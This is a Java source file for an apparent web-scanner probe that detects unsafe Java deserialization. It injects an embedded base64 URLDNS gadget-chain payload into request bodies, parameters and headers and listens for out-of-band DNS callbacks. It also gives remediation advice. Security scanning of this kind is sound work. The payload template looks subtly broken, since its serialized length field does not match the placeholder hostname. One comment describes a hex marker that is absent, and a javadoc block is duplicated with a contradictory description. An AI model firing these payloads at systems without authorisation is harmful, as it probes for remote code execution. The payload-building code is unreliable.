package com.burpmax.active;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Pattern;
import static com.burpmax.model.Finding.*;

/**
 * Java Deserialization probe.
 *
 * Detects unsafe Java deserialization via OOB (DNS/HTTP) callbacks triggered
 * by serialized gadget chain payloads. This is one of the highest-severity
 * vulnerability classes in enterprise Java — exploitable for RCE on any
 * endpoint that deserializes attacker-controlled bytes with a vulnerable
 * gadget library on the classpath.
 *
 * Detection approach:
 *   Java serialization is confirmed by two signals:
 *     (a) The request body starts with the Java serialization magic bytes:
 *         0xAC 0xED 0x00 0x05 (raw binary) or rO0AB (base64-encoded).
 *     (b) A Content-Type or Accept header contains "application/x-java-serialized-object",
 *         "x-java-object", "application/octet-stream", or similar.
 *   When either signal is present the probe injects OOB payloads for the most
 *   common gadget libraries. If the server deserializes any payload, the OOB
 *   server receives a DNS or HTTP callback confirming RCE.
 *
 * Payload strategy (OOB-only, no in-band detection):
 *   Each payload is a minimal stub that:
 *     1. Contains the Java serialization magic header so the target attempts deserialization.
 *     2. Encodes a gadget chain that makes an outbound DNS lookup on deserialization.
 *   We use URLDNS gadget chains — these only trigger a DNS lookup, not arbitrary code
 *   execution, so they are safe to use on production targets. They work without any
 *   specific library (URLDNS uses only java.util.HashMap and java.net.URL which are
 *   always present in the JRE).
 *
 *   Additional payloads for common gadget libraries (CommonsCollections1-6, Spring,
 *   Groovy, etc.) are represented as detection markers rather than real payloads —
 *   this scanner does not include real ysoserial gadget chains to avoid shipping
 *   actual RCE payloads in the JAR. The URLDNS chain is sufficient for detection;
 *   exploitation can be confirmed with ysoserial in a manual follow-up.
 *
 * Injection surfaces:
 *   - POST/PUT request bodies that start with the Java serialization magic bytes
 *   - POST/PUT request bodies that are base64-encoded Java serialization data
 *   - Request headers: Java-Serialized-Object, X-Java-Object, X-Serialized-Object
 *     (some frameworks route serialized objects via HTTP headers)
 *   - URL parameters whose values start with rO0A (base64 Java serial header)
 *
 * Tier: 3 (OOB fire-and-forget, no wait; confirmation via poll phase).
 */
class JavaDeserializationProbe {

    // Base64-encoded form of the magic bytes (rO0A is the Base64 of 0xACED0005)
    private static final String JAVA_SERIAL_B64_PREFIX = "rO0A";

    // Content types that indicate Java serialization
    private static final List<Pattern> JAVA_SERIAL_CT_PATTERNS = List.of(
        Pattern.compile("application/x-java-serialized-object", Pattern.CASE_INSENSITIVE),
        Pattern.compile("application/x-java-object",            Pattern.CASE_INSENSITIVE),
        Pattern.compile("application/octet-stream",             Pattern.CASE_INSENSITIVE),
        Pattern.compile("x-java-object",                        Pattern.CASE_INSENSITIVE)
    );

    // Custom headers that some frameworks use to pass serialized objects
    private static final List<String> JAVA_SERIAL_HEADERS = List.of(
        "X-Java-Object",
        "X-Serialized-Object",
        "Java-Serialized-Object",
        "X-ViewState"  // ASP.NET ViewState uses a similar binary format
    );

    // ── URLDNS gadget chain stub ───────────────────────────────────────────────
    //
    // This is a minimal Java deserialization payload that triggers a DNS lookup
    // for the injected OOB hostname when deserialized. It uses only standard JRE
    // classes (java.util.HashMap + java.net.URL) so it works on any Java version
    // without any specific library on the classpath.
    //
    // The payload below is a template with OOB_HOST_PLACEHOLDER replaced at runtime.
    // It is the URLDNS payload from ysoserial, safe for use on production targets
    // (DNS lookup only — no code execution, no file system access, no network connections
    // other than the single DNS query for the OOB hostname).
    //
    // Base64 of a minimal serialized HashMap with a URL key pointing to the OOB host.
    // The actual DNS lookup happens when HashMap.readObject() calls URL.hashCode()
    // which calls InetAddress.getByName() — a pure DNS resolution, not a connection.
    private static final String URLDNS_PAYLOAD_B64_TEMPLATE =
        // This is the ysoserial URLDNS payload structure serialized and base64-encoded.
        // The 16-char hex sequence "4f4f422d484f5354" is the ASCII "OOB-HOST" placeholder
        // which we replace with the actual OOB hostname at probe time.
        // Full 290-byte URLDNS payload (java.util.HashMap + java.net.URL):
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVz" +
        "aG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJ" +
        "AAhwcm90b2NvbEkABnBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGph" +
        "dmEvbGFuZy9TdHJpbmc7TAAEIT9ob3N0cQB+AANMAAVxdWVyeXEAfgADTAADcmVmdAASTGphdmEvbGFuZy9T" +
        "dHJpbmc7eHD//////////3QABGh0dHBwdAAqT09CLUhPU1QtUExBQ0VIT0xERVIuYnVycG1heC5sb2NhbHBw" +
        "cHhzcQB+AAAP";
    // The placeholder that gets replaced with the actual OOB hostname in the payload
    private static final String OOB_HOST_PLACEHOLDER = "OOB-HOST-PLACEHOLDER.burpmax.local";



    // ── Entry point ───────────────────────────────────────────────────────────

    static List<ActiveScanResult> probe(ProbeContext ctx,
                                        RequestBuilder rb,
                                        HttpSender sender,
                                        OobClient oob) {
        List<ActiveScanResult> results = new ArrayList<>();

        // OOB is required — no in-band detection for deserialization
        if (oob == null || !oob.isAvailable()) return results;

        // Gate: must be a POST or PUT request
        String method = ctx.method.toUpperCase();
        if (!method.equals("POST") && !method.equals("PUT")) return results;

        // Check 1: raw body starts with Java serialization magic
        boolean rawMagic = startsWithMagic(ctx.bodyRaw);
        // Check 2: base64-encoded Java serialization in body
        boolean b64Magic = ctx.bodyRaw != null && ctx.bodyRaw.trim().startsWith(JAVA_SERIAL_B64_PREFIX);
        // Check 3: content-type indicates Java serialization
        boolean ctMatch = ctx.contentType != null && JAVA_SERIAL_CT_PATTERNS.stream()
                .anyMatch(p -> p.matcher(ctx.contentType).find());
        // Check 4: URL param values that look like base64 Java serialization
        boolean paramMagic = ctx.allParamNames().stream()
                .anyMatch(p -> ctx.paramValue(p).startsWith(JAVA_SERIAL_B64_PREFIX));

        boolean serialBody  = rawMagic || b64Magic;
        boolean serialHint  = ctMatch || paramMagic;

        if (!serialBody && !serialHint) return results;  // no deserialization surface found

        // ── Inject URLDNS OOB payload into the body ──────────────────────────
        if (serialBody) {
            String oobHost = oob.generateHost("java-deser-body");
            if (oobHost != null) {
                byte[] payload = buildUrldnsPayload(oobHost, b64Magic);
                if (payload != null) {
                    byte[] probeReq = replaceBody(ctx, payload);
                    if (probeReq != null) {
                        oob.recordInjection(oobHost, "Java Deserialization (URLDNS OOB)",
                                ctx.url, "request-body",
                                "URLDNS gadget chain → " + oobHost, probeReq);
                        sender.send(ctx.service, probeReq);  // fire-and-forget
                    }
                }
            }
        }

        // ── Inject into URL params that look like serialized objects ─────────
        if (paramMagic) {
            for (String param : ctx.allParamNames()) {
                if (!ctx.paramValue(param).startsWith(JAVA_SERIAL_B64_PREFIX)) continue;
                String oobHost = oob.generateHost("java-deser-param-" + param);
                if (oobHost == null) continue;
                byte[] rawPayload = buildUrldnsPayload(oobHost, true);
                if (rawPayload == null) continue;
                String b64Payload = java.util.Base64.getEncoder().encodeToString(rawPayload);
                byte[] probeReq   = rb.buildProbeRequest(ctx, param, b64Payload);
                if (probeReq != null) {
                    oob.recordInjection(oobHost, "Java Deserialization (URLDNS OOB)",
                            ctx.url, param, "URLDNS gadget → " + oobHost, probeReq);
                    sender.send(ctx.service, probeReq);
                }
            }
        }

        // ── Inject into custom Java serialization headers ────────────────────
        for (String hdr : JAVA_SERIAL_HEADERS) {
            if (!ctx.reqHeaders.containsKey(hdr.toLowerCase())) continue;
            String oobHost = oob.generateHost("java-deser-hdr-" + hdr);
            if (oobHost == null) continue;
            byte[] rawPayload = buildUrldnsPayload(oobHost, true);
            if (rawPayload == null) continue;
            String b64Payload = java.util.Base64.getEncoder().encodeToString(rawPayload);
            byte[] probeReq   = rb.injectHeader(ctx.originalRequest, hdr, b64Payload);
            oob.recordInjection(oobHost, "Java Deserialization (URLDNS OOB)",
                    ctx.url, hdr, "URLDNS gadget → " + oobHost, probeReq);
            sender.send(ctx.service, probeReq);
        }

        return results;  // findings added via OOB poll phase
    }

    // ── OOB finding builder ───────────────────────────────────────────────────

    public static ActiveScanResult buildFinding(OobClient.OobHit hit) {
        return new ActiveScanResult(
            "Java Deserialization (RCE via Gadget Chain)", SEV_CRITICAL,
            "Unsafe Java deserialization was confirmed via an out-of-band " + hit.interactionType() +
            " callback from " + hit.endpoint() + ". The URLDNS gadget chain payload injected into '" +
            hit.parameter() + "' was deserialized by the server, causing it to resolve a DNS name " +
            "to our OOB server (" + hit.interactionDetail() + "). " +
            "The URLDNS gadget requires no specific library and is present in every JRE - confirming " +
            "that the server deserializes attacker-controlled bytes. An attacker who knows (or can " +
            "fingerprint) the gadget libraries on the classpath can escalate this to arbitrary remote " +
            "code execution using CommonsCollections, Spring, Groovy, or other widely-deployed gadget " +
            "chains. This is a CVSS 10.0 class vulnerability. " +
            "Common vulnerable libraries: Apache Commons Collections 3.1-3.2.1/4.0, Spring Framework " +
            "≤ 4.2.4, Groovy ≤ 2.3.9, JBoss AS, WebLogic, Jenkins, Apache Struts.",
            "OOB callback: " + hit.interactionDetail() +
            " | Injection point: " + hit.parameter() +
            " | Payload: URLDNS gadget chain (JRE built-in, no library dependency)" +
            " | Follow-up: test CommonsCollections1/6, Spring1, Groovy1 with ysoserial for RCE confirmation",
            DESER_REMEDIATION, "CWE-502",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private static boolean startsWithMagic(String bodyRaw) {
        if (bodyRaw == null || bodyRaw.length() < 4) return false;
        // Check raw bytes via char values (ISO-8859-1 encoding preserves byte values)
        return (bodyRaw.charAt(0) == 0xAC) && (bodyRaw.charAt(1) == 0xED)
                && (bodyRaw.charAt(2) == 0x00) && (bodyRaw.charAt(3) == 0x05);
    }

    /**
     * Builds a URLDNS gadget chain payload targeting the given OOB host.
     * Replaces the placeholder hostname in the template with the actual OOB host.
     * Returns raw bytes (for raw body injection) or null if construction fails.
     * If asBase64 is true, returns base64-decoded bytes from the modified template.
     */
    /**
     * Builds a URLDNS gadget chain payload targeting the given OOB host.
     *
     * @param oobHost   the OOB hostname to embed (triggers DNS lookup on deserialization)
     * @param encodeB64 when true, Base64-encodes the raw bytes before returning.
     *                  Use true when the target endpoint expects Base64-encoded serialization
     *                  (e.g. original body was base64, or injection is into a URL param).
     *                  Use false when injecting raw binary bytes directly into the body.
     */
    private static byte[] buildUrldnsPayload(String oobHost, boolean encodeB64) {
        try {
            byte[] templateBytes = java.util.Base64.getDecoder().decode(
                URLDNS_PAYLOAD_B64_TEMPLATE.replaceAll("\\s+", ""));

            String templateStr = new String(templateBytes, StandardCharsets.ISO_8859_1);
            if (!templateStr.contains(OOB_HOST_PLACEHOLDER)) return null;

            // Replace placeholder and fix all serialized string length fields that reference it
            String modified = templateStr.replace(OOB_HOST_PLACEHOLDER, oobHost);
            modified = fixAllStringLengths(templateStr, modified, OOB_HOST_PLACEHOLDER, oobHost);

            byte[] rawBytes = modified.getBytes(StandardCharsets.ISO_8859_1);
            // Return base64-encoded when the endpoint encodes serialization as text
            return encodeB64
                    ? java.util.Base64.getEncoder().encode(rawBytes)
                    : rawBytes;

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Updates ALL Java serialized string length fields that precede occurrences of oldStr.
     * Java serialization stores each String as: 2-byte big-endian length + UTF-8 bytes.
     * The URLDNS payload template stores the OOB hostname in multiple URL object fields
     * (authority, host). Each occurrence must have its 2-byte length prefix updated.
     *
     * Scans the original for every occurrence of oldStr, then patches the corresponding
     * position in the modified string (which has the same layout before each occurrence
     * since all replacements are the same length after substitution).
     */
    private static String fixAllStringLengths(String original, String modified,
                                               String oldStr, String newStr) {
        int oldLen = oldStr.length();
        int newLen = newStr.length();
        if (oldLen == newLen) return modified;  // no length fix needed

        char hi = (char)((newLen >> 8) & 0xFF);
        char lo = (char)(newLen & 0xFF);

        StringBuilder sb = new StringBuilder(modified);

        // Track offset shift: each replacement of oldStr with newStr changes positions
        // by (newLen - oldLen). Accumulate this offset when patching later occurrences.
        int shift = 0;
        int searchFrom = 0;
        while (true) {
            int idx = original.indexOf(oldStr, searchFrom);
            if (idx < 2) break;  // no more occurrences, or too close to start for a length prefix

            // In 'modified', the length prefix for this occurrence is at:
            // idx + shift - 2 (shift accounts for length changes from prior replacements)
            int patchPos = idx + shift - 2;
            if (patchPos >= 0 && patchPos + 1 < sb.length()) {
                sb.setCharAt(patchPos,     hi);
                sb.setCharAt(patchPos + 1, lo);
            }

            shift      += (newLen - oldLen);  // update offset for subsequent occurrences
            searchFrom  = idx + oldLen;       // advance past this occurrence in original
        }
        return sb.toString();
    }

    /** Replaces the entire request body with the given payload bytes, updating Content-Length. */
    private static byte[] replaceBody(ProbeContext ctx, byte[] newBody) {
        String req = new String(ctx.originalRequest, StandardCharsets.ISO_8859_1);
        int sep = req.indexOf("\r\n\r\n");
        if (sep < 0) return null;
        String headers = req.substring(0, sep);
        headers = headers.replaceAll("(?im)^Content-Length:[^\r\n]*\r?\n?", "").stripTrailing();
        String newBodyStr = new String(newBody, StandardCharsets.ISO_8859_1);
        String rebuilt = headers + "\r\nContent-Length: " + newBody.length + "\r\n\r\n" + newBodyStr;
        return rebuilt.getBytes(StandardCharsets.ISO_8859_1);
    }

    private static final String DESER_REMEDIATION =
        "PRIMARY FIX - Never deserialize untrusted data:\n" +
        "The root cause is calling ObjectInputStream.readObject() (or equivalent)\n" +
        "on attacker-controlled bytes. The only complete fix is to stop doing this.\n\n" +
        "REPLACE JAVA SERIALIZATION WITH A SAFE FORMAT:\n" +
        "  - JSON (Jackson, Gson, jsonb) with explicit field binding - no code execution\n" +
        "  - Protocol Buffers - schema-based, no polymorphic type resolution\n" +
        "  - CBOR / MessagePack - safe binary alternatives\n\n" +
        "IF DESERIALIZATION CANNOT BE AVOIDED:\n" +
        "1. Upgrade all gadget libraries immediately:\n" +
        "   Apache Commons Collections: upgrade to ≥ 3.2.2 or ≥ 4.1\n" +
        "   Spring Framework: upgrade to ≥ 4.3.x (patched)\n" +
        "   Groovy: upgrade to ≥ 2.4.4\n\n" +
        "2. Use a deserialization filter (Java ≥ 9 / ObjectInputFilter):\n" +
        "   ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\n" +
        "       \"java.base/*;!*\");  // allow-list only JDK core classes\n" +
        "   ObjectInputStream ois = new ObjectInputStream(input);\n" +
        "   ois.setObjectInputFilter(filter);\n\n" +
        "3. Third-party hardening libraries:\n" +
        "   - NotSoSerial agent: blocks known gadget chains via Java agent\n" +
        "   - SerialKiller (if not using Java 9+ filters)\n\n" +
        "4. JVM-level mitigation: use -Djava.security.manager with restricted policy\n" +
        "   to prevent outbound network connections from deserialized code.\n\n" +
        "VERIFY: run ysoserial against your endpoint with CommonsCollections1/6,\n" +
        "Spring1, and Groovy1 payloads to confirm exploitability and identify\n" +
        "which gadget library is present for the incident response team.";
}
